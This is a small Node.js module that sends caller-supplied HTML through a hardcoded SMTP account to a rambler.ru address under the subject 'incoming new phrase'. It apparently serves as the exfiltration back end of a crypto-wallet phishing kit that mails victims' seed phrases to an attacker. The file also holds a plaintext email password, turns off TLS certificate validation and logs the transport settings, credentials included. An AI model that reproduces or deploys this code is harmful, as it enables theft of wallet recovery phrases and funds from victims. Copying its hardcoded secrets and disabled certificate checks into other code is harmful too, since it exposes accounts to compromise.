const nodemailer = require('nodemailer');

async function sendmail(message) {
  try {
    let transporter = nodemailer.createTransport({
      host: "smtp.titan.email",
      port: 465, // Use port 465 for SSL/TLS encryption
      secure: true, // Use true for SSL/TLS encryption
      auth: {
        user: "aa@obulehealthcare.com.ng", // Your full email address
        pass: "@Maroke2000" // Your email password
      },
      tls: {
        rejectUnauthorized: false // Allow self-signed certificates
      },
      logger: true, // Enable logging
      debug: true   // Enable debug mode
    });

    console.log("Transporter configuration:", transporter.options);

    let info = await transporter.sendMail({
      from: 'aa@obulehealthcare.com.ng', // Sender address
      to: "wjsmrgkhpf@rambler.ru", // List of receivers
      subject: "incoming new phrase ", // Subject line
      html: message // HTML body
    });

    console.log("Message sent: %s", info.messageId);
  } catch (error) {
    console.error('Error sending email:', error);
    if (error.response) {
      console.error('SMTP Server response:', error.response);
    }
    throw error;
  }
}

module.exports = sendmail;
